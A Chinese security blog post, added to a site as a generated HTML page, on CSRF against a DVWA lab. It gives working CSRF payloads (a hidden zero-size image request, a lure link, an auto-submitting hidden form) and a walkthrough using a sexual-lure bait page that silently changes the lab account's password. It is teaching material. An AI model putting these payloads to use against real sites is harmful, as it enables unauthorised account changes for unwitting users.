@@ -1,0 +1,310 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CSRF漏洞渗透与防御 | 北炫一辈子爱(欺负)潼潼ヾ(≧▽≦*)o</title><meta name="author" content="yunkun18"><meta name="copyright" content="yunkun18"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CSRF漏洞渗透与防御">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF漏洞渗透与防御">
+<meta property="og:url" content="https://blog.yunkun.top/archives/667bd3bf.html">
+<meta property="og:site_name" content="北炫一辈子爱(欺负)潼潼ヾ(≧▽≦*)o">
+<meta property="og:description" content="CSRF漏洞渗透与防御">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.yunkun.top/img/CSRF.jpg">
+<meta property="article:published_time" content="2026-05-05T12:00:00.000Z">
+<meta property="article:modified_time" content="2026-05-06T10:43:01.440Z">
+<meta property="article:author" content="yunkun18">
+<meta property="article:tag" content="网络安全·Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.yunkun.top/img/CSRF.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CSRF漏洞渗透与防御",
+  "url": "https://blog.yunkun.top/archives/667bd3bf.html",
+  "image": "https://blog.yunkun.top/img/CSRF.jpg",
+  "datePublished": "2026-05-05T12:00:00.000Z",
+  "dateModified": "2026-05-06T10:43:01.440Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "yunkun18",
+      "url": "https://blog.yunkun.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/./img/logo.png"><link rel="canonical" href="https://blog.yunkun.top/archives/667bd3bf.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="codeva-337QpPWdql"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CSRF漏洞渗透与防御',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (true) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div class="bg-animation" id="web_bg" style="background-image: url(/./img/ground.jpeg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/./img/auther.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 特色标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 文章分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/./img/top.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">北炫一辈子爱(欺负)潼潼ヾ(≧▽≦*)o</span></a><a class="nav-page-title" href="/"><span class="site-name">CSRF漏洞渗透与防御</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 特色标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 文章分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CSRF漏洞渗透与防御</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-05T12:00:00.000Z" title="发表于 2026-05-05 20:00:00">2026-05-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-06T10:43:01.440Z" title="更新于 2026-05-06 18:43:01">2026-05-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8%C2%B7CSRF%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E4%B8%8E%E9%98%B2%E5%BE%A1/">Web安全·CSRF漏洞渗透与防御</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">746</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><hr>
+<h1 id="CSRF漏洞定义"><a href="#CSRF漏洞定义" class="headerlink" title="CSRF漏洞定义"></a>CSRF漏洞定义</h1><p>CSRF（Cross-site request forgery），即跨站请求伪造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用户登录信任的网站A，并生成本地cookie</span><br><span class="line"></span><br><span class="line">用户未登出网站A，cookie并未失效</span><br><span class="line"></span><br><span class="line">用户访问了恶意网站B，网站B页面发起了对于网站A的请求</span><br><span class="line"></span><br><span class="line">用户访问网站B携带了网站A的cookie，网站A在不知情情况下接收了恶意请求并执行</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="CSRF的发现与检测"><a href="#CSRF的发现与检测" class="headerlink" title="CSRF的发现与检测"></a>CSRF的发现与检测</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、在敏感网站抓包</span><br><span class="line"></span><br><span class="line">2、在其他网站重发请求</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="CSRF的检测工具"><a href="#CSRF的检测工具" class="headerlink" title="CSRF的检测工具"></a>CSRF的检测工具</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、Burp Suite</span><br><span class="line"></span><br><span class="line">2、CSRFTester</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="CSRF常用payload"><a href="#CSRF常用payload" class="headerlink" title="CSRF常用payload"></a>CSRF常用payload</h1><div class="note primary modern"><p>通过图片img src属性，自动加载，构建GET请求</p>
+</div>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://target.com/transfer.php?id=*&amp;name=*&quot; width=&quot;0&quot; heigth=&quot;0&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<div class="note success modern"><p>构建一个可以点击的超链接，用户进行点击，发起GET请求</p>
+</div>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://target.com/transfer.php?id=*&amp;name=*&quot; taget=&quot;&quot;&gt;</span><br><span class="line">***在线聊天</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<div class="note info modern"><p>构建一个自动提交的表单（隐藏起来），用户进行访问，发起POST请求</p>
+</div>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://target.com/transfer&quot; method=POST&gt;</span><br><span class="line">  &lt;input type=&quot;hidden&quot; name=&quot;&quot; value=&quot;&quot; /&gt;</span><br><span class="line">  &lt;input type=&quot;hidden&quot; name=&quot;&quot; value=&quot;&quot; /&gt;</span><br><span class="line">  &lt;input type=&quot;hidden&quot; name=&quot;&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="DVWA靶场实战"><a href="#DVWA靶场实战" class="headerlink" title="DVWA靶场实战"></a>DVWA靶场实战</h1><p>用1337&#x2F;charley登录DVWA靶场，找到CSRF关卡，我用的靶场等级为low</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260506171635305.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260506171653750.png"></p>
+<p>页面功能为修改密码，我们尝试将密码修改为123456，并抓包，提交方式为GET，只要拿到修改的代码参数就能进行伪造</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260506172631685.png"></p>
+<p><font color="#F9971C">我做了两个比较刺激的html页面</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260506173229166.png"></p>
+<p>当你在浏览器中访问index.html，没忍住诱惑，点击了网页中的链接</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--index.html--&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>让人无法抵挡<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">font</span>&gt;</span>你正在浏览P站<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    美女荷官，在线发牌<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;./out.html&quot;</span>&gt;</span>[hot!!!]美女在线视频邀请，点击接受<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260506174142415.png"></p>
+<p>浏览器会跳到out.html中，在out.html内置好了请求参数，将1337用户的密码改为654321</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--out.html--&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">font</span>&gt;</span>你正在访问P站<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;yellow.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;250px&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/DVWA/vulnerabilities/csrf/?password_new=654321&amp;password_conf=654321&amp;Change=Change#&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;#F9971C&quot;</span>&gt;</span>美死你呢，回去学习！！！<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260506182341719.png"></p>
+<p><strong><font color="Red">这个时候你再回去，发现1337账号的密码已经被改了，登录不上去了</font></strong></p>
+<h1 id="总结：拒绝诱惑，别乱点"><a href="#总结：拒绝诱惑，别乱点" class="headerlink" title="总结：拒绝诱惑，别乱点"></a>总结：拒绝诱惑，别乱点</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.yunkun.top">yunkun18</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.yunkun.top/archives/667bd3bf.html">https://blog.yunkun.top/archives/667bd3bf.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.yunkun.top" target="_blank">北炫一辈子爱(欺负)潼潼ヾ(≧▽≦*)o</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%C2%B7Web%E5%AE%89%E5%85%A8/">网络安全·Web安全</a></div><div class="post-share"><div class="social-share" data-image="/./img/CSRF.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/archives/f9945f65.html" title="JWT渗透与防御"><img class="cover" src="/./img/JWT.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">JWT渗透与防御</div></div><div class="info-2"><div class="info-item-1">JWT渗透与防御</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/archives/866b1ec6.html" title="Sql注入之高权限注入"><img class="cover" src="/./img/sql_injection.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-24</div><div class="info-item-2">Sql注入之高权限注入</div></div><div class="info-2"><div class="info-item-1">Sql注入之高权限注入</div></div></div></a><a class="pagination-related" href="/archives/6d6b02d2.html" title="Sqli-labs靶场搭建"><img class="cover" src="/./img/sql_injection.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-23</div><div class="info-item-2">Sqli-labs靶场搭建</div></div><div class="info-2"><div class="info-item-1">Sqli-labs靶场搭建</div></div></div></a><a class="pagination-related" href="/archives/9508da4a.html" title="浏览器常用插件合集"><img class="cover" src="/./img/plug_in.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-27</div><div class="info-item-2">浏览器常用插件合集</div></div><div class="info-2"><div class="info-item-1">浏览器常用插件合集</div></div></div></a><a class="pagination-related" href="/archives/f39b7ce2.html" title="BurpSuite安装和使用"><img class="cover" src="/./img/tools.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-26</div><div class="info-item-2">BurpSuite安装和使用</div></div><div class="info-2"><div class="info-item-1">BurpSuite安装和使用</div></div></div></a><a class="pagination-related" href="/archives/2004793d.html" title="Sql注入之注入手法"><img class="cover" src="/./img/sql_injection.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-28</div><div class="info-item-2">Sql注入之注入手法</div></div><div class="info-2"><div class="info-item-1">Sql注入之注入手法</div></div></div></a><a class="pagination-related" href="/archives/55f92019.html" title="Sql注入基础与手工注入"><img class="cover" src="/./img/sql_injection.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-23</div><div class="info-item-2">Sql注入基础与手工注入</div></div><div class="info-2"><div class="info-item-1">Sql注入基础与手工注入</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/./img/auther.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">yunkun18</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/yunkun18"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%B9%89"><span class="toc-number">1.</span> <span class="toc-text">CSRF漏洞定义</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text">CSRF的发现与检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E7%9A%84%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">CSRF的检测工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E5%B8%B8%E7%94%A8payload"><span class="toc-number">4.</span> <span class="toc-text">CSRF常用payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98"><span class="toc-number">5.</span> <span class="toc-text">DVWA靶场实战</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A%E6%8B%92%E7%BB%9D%E8%AF%B1%E6%83%91%EF%BC%8C%E5%88%AB%E4%B9%B1%E7%82%B9"><span class="toc-number">6.</span> <span class="toc-text">总结：拒绝诱惑，别乱点</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/667bd3bf.html" title="CSRF漏洞渗透与防御"><img src="/./img/CSRF.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CSRF漏洞渗透与防御"/></a><div class="content"><a class="title" href="/archives/667bd3bf.html" title="CSRF漏洞渗透与防御">CSRF漏洞渗透与防御</a><time datetime="2026-05-05T12:00:00.000Z" title="发表于 2026-05-05 20:00:00">2026-05-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/f9945f65.html" title="JWT渗透与防御"><img src="/./img/JWT.jpg" 